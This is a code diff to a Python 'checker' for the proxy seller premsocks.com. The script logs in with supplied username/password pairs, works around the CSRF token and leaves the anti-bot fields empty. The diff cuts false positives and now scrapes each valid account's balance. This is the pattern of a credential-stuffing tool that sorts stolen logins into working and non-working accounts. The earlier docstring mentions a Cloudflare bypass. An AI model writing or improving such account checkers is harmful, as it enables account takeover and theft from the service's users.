@@ -1,6 +1,6 @@
 """
 Checker for Premsocks (premsocks.com)
-Uses traditional form-based login with CSRF token and Cloudflare bypass.
+Fixes false positives, extracts and displays available balance.
 """
 import re
 import threading
@@ -38,14 +38,14 @@ def check(username: str, password: str) -> Tuple[bool, str]:
     })
 
     try:
-        # Step 1: GET login page to extract CSRF token and hidden fields
+        # Step 1: GET login page to extract CSRF token
         resp = session.get(LOGIN_URL, timeout=TIMEOUT)
         if resp.status_code != 200:
             return False, f"Failed to load login page (HTTP {resp.status_code})"
 
         html = resp.text
 
-        # Extract the CSRF token from the hidden input with name "_token"
+        # Extract CSRF token
         token_match = re.search(r'<input[^>]*name="_token"[^>]*value="([^"]+)"', html, re.I)
         csrf_token = token_match.group(1) if token_match else ""
 
@@ -54,36 +54,56 @@ def check(username: str, password: str) -> Tuple[bool, str]:
             "username": username,
             "password": password,
             "_token": csrf_token,
-            "ctoken": "",    # left empty; may be set by turnstile, but we'll try without
+            "ctoken": "",
             "fp_dd": "",
             "fp_dd_json": "",
             "fp": "",
         }
 
-        # Step 2: POST credentials (the form action is the same URL)
+        # Step 2: POST credentials
         post_resp = session.post(LOGIN_URL, data=payload, allow_redirects=True, timeout=TIMEOUT)
 
-        # Step 3: Check for success indicators in the final page
-        final_html = post_resp.text.lower()
+        final_html = post_resp.text
+        final_html_lower = final_html.lower()
         final_url = post_resp.url.lower()
 
-        # Success: presence of logout link or user panel
-        if "logout" in final_html or 'id="user"' in final_html:
-            return True, "Login successful"
+        # --- FIRST: Check for error messages ---
+        error_phrases = [
+            "these credentials do not match our records",
+            "invalid",
+            "incorrect",
+            "wrong",
+            "error",
+            "alert alert-danger",
+            "alert-danger",
+            "class=\"error\"",
+        ]
+        for phrase in error_phrases:
+            if phrase in final_html_lower:
+                error_msg = re.search(r'<div[^>]*class="[^"]*alert[^"]*"[^>]*>(.*?)</div>', final_html, re.I | re.S)
+                if error_msg:
+                    return False, f"Login failed: {error_msg.group(1).strip()}"
+                return False, "Invalid credentials"
 
-        # If we're redirected to the socks list page, also success
+        # --- SECOND: Check for success indicators ---
+        if "logout" in final_html_lower or 'id="user"' in final_html_lower:
+            # Extract balance
+            balance_match = re.search(r'<span[^>]*id="balance-text"[^>]*>(.*?)</span>', final_html, re.I)
+            balance = balance_match.group(1).strip() if balance_match else "N/A"
+            return True, f"Login successful. Balance: {balance}"
+
         if "socks-proxy" in final_url:
-            return True, "Login successful (redirected to socks list)"
+            # Sometimes the balance might be on the redirected page (if we allowed redirects, we get that page)
+            # Try to extract balance from final_html anyway
+            balance_match = re.search(r'<span[^>]*id="balance-text"[^>]*>(.*?)</span>', final_html, re.I)
+            balance = balance_match.group(1).strip() if balance_match else "N/A"
+            return True, f"Login successful (redirected to socks list). Balance: {balance}"
 
-        # Check for error messages
-        if "invalid" in final_html or "incorrect" in final_html:
-            return False, "Invalid credentials"
+        # --- THIRD: If still on login page (has login form) ---
+        if 'name="username"' in final_html_lower and 'name="password"' in final_html_lower:
+            return False, "Login failed – still on login page (no error shown)"
 
-        # If we are still on the login page with the login form
-        if 'name="username"' in final_html and 'name="password"' in final_html:
-            return False, "Login failed – still on login page"
-
-        # Fallback: if we don't see the login form but also no logout, treat as unknown
+        # --- FALLBACK ---
         return False, "Login failed – unknown response"
 
     except Exception as e:
